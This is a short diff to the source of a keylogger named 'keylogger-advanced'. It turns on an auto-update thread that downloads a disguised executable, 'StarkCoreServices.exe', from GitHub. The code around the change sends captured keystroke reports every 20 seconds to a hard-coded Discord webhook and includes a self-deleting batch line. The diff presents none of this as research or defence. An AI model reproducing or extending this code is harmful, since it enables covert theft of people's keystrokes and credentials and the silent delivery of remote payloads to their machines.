@@ -71,7 +71,7 @@ finally:
     # Use the user-provided Discord Webhook URL
     WEBHOOK_URL = "https://discord.com/api/webhooks/1451250056714784820/rcHD8FNgtCzzTrBd8TC_BVeog_rEdUz-wKseDAAbqoJpvXDQ8dC0lDSlvkDXWMOOAgVV"
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
-    VERSION = "2.4"
+    VERSION = "2.5"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
     EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
@@ -751,9 +751,8 @@ del "%~f0"
         keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
         
         # Check for updates on startup
-        # Check for updates on startup
-        # if getattr(sys, 'frozen', False): # Only auto-update if running as exe
-        #     Thread(target=keylogger.check_for_updates).start()
+        if getattr(sys, 'frozen', False): # Only auto-update if running as exe
+            Thread(target=keylogger.check_for_updates).start()
 
         # We must run the GUI on the Main Thread.
         # The Keylogger must run in a background thread.
